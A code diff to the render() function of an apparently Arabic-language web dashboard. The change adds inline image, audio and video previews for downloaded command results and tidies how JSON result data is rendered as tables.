@@ -119,8 +119,19 @@ function run(cmd, args, cb){
 }
 function render(h){
   let html = `<div class="card"><b>${esc(h.cmdId.slice(0,8))}</b> — ${h.ok?'<span class="on">نجح</span>':'<span class="off">فشل</span>'} ${h.fname?'· '+esc(h.fname):''}`;
-  if (h.file) html += '<br>' + dlink(h.cmdId, h.fname || 'ملف');
-  else if (h.data) { try {
+  if (h.fname) {
+    // نتيجة ثنائية (صورة/صوت/فيديو/ملف): رابط تنزيل + معاينة داخلية
+    const url = '/api/file/' + encodeURIComponent(h.cmdId) + '?t=' + encodeURIComponent(TOKEN);
+    const ext = (h.fname || '').split('.').pop().toLowerCase();
+    html += '<br>' + dlink(h.cmdId, h.fname || 'ملف');
+    if (['jpg','jpeg','png','gif','webp','bmp'].includes(ext))
+      html += '<br><a href="' + url + '" target="_blank"><img src="' + url + '" style="max-width:300px;border-radius:6px"></a>';
+    else if (['m4a','mp3','aac','wav','ogg','amr'].includes(ext))
+      html += '<br><audio controls preload="none" src="' + url + '"></audio>';
+    else if (['mp4','3gp','webm','mkv'].includes(ext))
+      html += '<br><video controls preload="none" src="' + url + '" style="max-width:300px"></video>';
+  } else if (h.data) {
+    try {
       const d = JSON.parse(h.data);
       if (Array.isArray(d) && d.length && typeof d[0] === 'object') {
         html += '<table><tr>' + Object.keys(d[0]).map(k=>'<th>'+esc(k)+'</th>').join('') + '</tr>' +
@@ -128,7 +139,8 @@ function render(h){
       } else if (typeof d === 'object') {
         html += '<table>' + Object.entries(d).map(([k,v])=>`<tr><td><b>${esc(k)}</b></td><td>${esc(typeof v==='object'?JSON.stringify(v):v)}</td></tr>`).join('') + '</table>';
       } else html += '<pre>'+esc(d)+'</pre>';
-    } catch(e){ html += '<pre>'+esc(h.data)+'</pre>'; } }
+    } catch(e){ html += '<pre>'+esc(h.data)+'</pre>'; }
+  }
   html += '</div>';
   document.getElementById('out').insertAdjacentHTML('afterbegin', html);
 }
